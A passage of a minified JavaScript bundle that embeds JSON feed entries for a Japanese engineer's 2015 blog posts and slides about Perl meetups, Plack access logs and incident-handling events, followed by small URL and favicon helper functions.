目の前に僕らの道がある技術MySQLのLINEAR KEY パーティションでPKで検索しても遅い場合 - ふり返る暇なんて無いねPerlモジュールのバージョン比較したい - ふり返る暇なんて無いねポエム普段の行動がものをいう - ふり返る暇なんて無いね判断と判断の変更 - ふり返る暇なんて無いね感覚値はあくまで感覚値 - ふり返る暇なんて無いね次の四半期お仕事的にはもう一個の事業部のPSGI/Plack化と開発環境の改善をメインにやってくと思います。ここ最近ちょっといろいろ腹に貯めすぎなので、もう少し心にゆとりをもっていけたらなとは思いまする。","isoDate":"2015-07-03T00:00:00.000Z","dateMiliSeconds":1435881600000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"他社の障害対応きにならNight! に行ってきた","link":"https://blog.masasuzu.net/entry/2015/07/02/134402","contentSnippet":"エンジニア交流会〜他社の障害対応きにならNight!〜 on Zusaarwww.zusaar.com一昨日の話ですが、Gaiaxさんに行ってきました。内容に関してはけっこうグレーな感じなこともあるので、話せないのですが、あー、あるよねー。とか だいぶつらい。。。って話を聞けて楽しかったです。他山の石にしたいです。インシデント管理に関してはちょっと痛いところがあるので見直したいなと思いました。懇親会で深い話が聞けていろいろ学びがありました。すごい楽しかったので次回もあれば参加したいです。寿司 pic.twitter.com/RnLrH5mxlp— masasuzu? (@masasuz) June 30, 2015内容言えないけどすごい為になってる— masasuzu? (@masasuz) June 30, 2015だいぶつらい話聞いてるもの— masasuzu? (@masasuz) June 30, 2015炎上案件だ。。。— masasuzu? (@masasuz) June 30, 2015インシデント管理に関してはちょっと痛いところあるなと思った。— masasuzu? (@masasuz) June 30, 2015なかなかこういう他社の障害事例聞けないので、今日は楽しかった。— masasuzu? (@masasuz) June 30, 2015innodbのデータ圧縮すると並列性が犠牲になるってのは、初耳だったのでちゃんと調べたい。— masasuzu? (@masasuz) June 30, 2015","isoDate":"2015-07-02T04:44:02.000Z","dateMiliSeconds":1435812242000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"#gotandapm Gotanda.pm Perl Technology Conference #5 でLTの高速化に失敗しました","link":"https://blog.masasuzu.net/entry/2015/06/25/184549","contentSnippet":"Gotanda.pm Perl Technology Conference #5 (2015/06/24 19:30〜)gotanda-pm.connpass.comGtanda.pmでLTしてきました。#gotandapm LTの高速化に失敗しました。— masasuzu? (@masasuz) June 24, 2015内容としてはPlack Applicationのアクセスログの話です。アクセスログそのものの話アクセスログの収集の話アクセスログの可視化/集計の話1個目の論点しか話せませんでした。猛省します。次回は事故らずに話したいです。最近Kibana4とElasticsearchを使っていてだいぶアクセスログに限らず ログ解析が捗っているので、その辺も別の機会に話せたらと思います。他の人の発表では、skajiさんの Acme::CPAN::Installerの発表がすごかったです。cpanモジュールをインストール出来るとこんなに速くなるのかと感心しました。業務で使いたいと思うくらいには速かったです。そのほかの人の発表も楽しく聞かせてもらいました。gotandapm参加者の皆さん！吉祥寺.pm4は、まだまだ参加者募集中です！https://t.co/JwGFxDOnXi#kichijojipm #gotandapm— magnoliak (@magnolia_k_) June 24, 2015どうやら吉祥寺.pm 来月開催らしいですよ。","isoDate":"2015-06-25T09:45:49.000Z","dateMiliSeconds":1435225549000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2015-06-25_gotanda.pm5","link":"https://speakerdeck.com/masasuzu/2015-06-25-gotanda-dot-pm5","contentSnippet":"Plackのアクセスログの話","isoDate":"2015-06-24T04:00:00.000Z","dateMiliSeconds":1435118400000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"#kichijojipm 吉祥寺.pm #3 に参加してきました。","link":"https://blog.masasuzu.net/entry/2015/04/19/kichijoji.pm-3","contentSnippet":"吉祥寺.pm行ってきました。吉祥寺.pm (kichijojipm) #3 : ATNDatnd.org今回はツールチェインがテーマと言うことで、Minillaの話題が2件ほどあって、参考になりました。今回特によかったなと思ったのがpapixさんの新人研修の話でした。ガイアックスさんはここ二年くらいで新人研修を整備し始めたそうで、だいぶ充実した内容をやっていそうなので、こっそり参加したいです。#kichijojipm ガイアックスに新人研修受けに行きたい— masasuzu? (@masasuz) April 17, 2015話の中で研修資料をスライドじゃ無くてドキュメントとして残すってのが、印象に残ってます。OJTが基本なのですが、開発グループのエンジニアの有志が社内勉強会枠の時間*1で新人さんに最低限知っておいて欲しい技術基礎の勉強会を行っています。wikiに残しておいて、次年度使い回せるように + 中途の人が入ってきたときも一通り見れば分かるようにしてます。その辺、アプローチが似ているなと思います。さておき、今回も楽しかったです、上級者向けの話からperl少し書ける人でも役に立つ話まで聞けてレベル感的にも良い感じです。主催のmagnoliakさん、htk291さんありがとうございました。次回の吉祥寺.pm楽しみにしてます。吉祥寺.pm in 五反田楽しみにしてます!!!五反田で吉祥寺.pmとか。— 吉祥寺.pm (@kichijojipm) April 17, 2015参照吉祥寺.pm3終わりました - kichijojipm’s blogkichijojipm.hatenablog.com余談SSID: TMNetwork がいてふいた— masasuzu? (@masasuz) April 17, 2015*1:弊社、毎日終業定時前の1時間は勉強会の時間と会議室が確保されていて、好きにやって良いことになってる。もちろん毎日は開かれない","isoDate":"2015-04-19T06:59:42.000Z","dateMiliSeconds":1429426782000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2015-03-25_gotanda.pm4 ","link":"https://speakerdeck.com/masasuzu/2015-03-25-gotanda-dot-pm4","contentSnippet":"mod_perlなプロジェクトをPSGI/Plack対応しようとしてる話。","isoDate":"2015-03-25T04:00:00.000Z","dateMiliSeconds":1427256000000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"}]')},7542:(e,t,o)=>{o.d(t,{M8:()=>i,kR:()=>n,mr:()=>s,nv:()=>r});var a=o(1202);function r(e){return a.o.find(t=>t.id===e)}function i(e){let t=new URL(e);return(null==t?void 0:t.hostname)||"blog"}function n(e){return"https://www.google.com/s2/favicons?domain=".concat(e)}function s(e){return"/members/".concat(encodeURIComponent(e))}o(6067)}}]);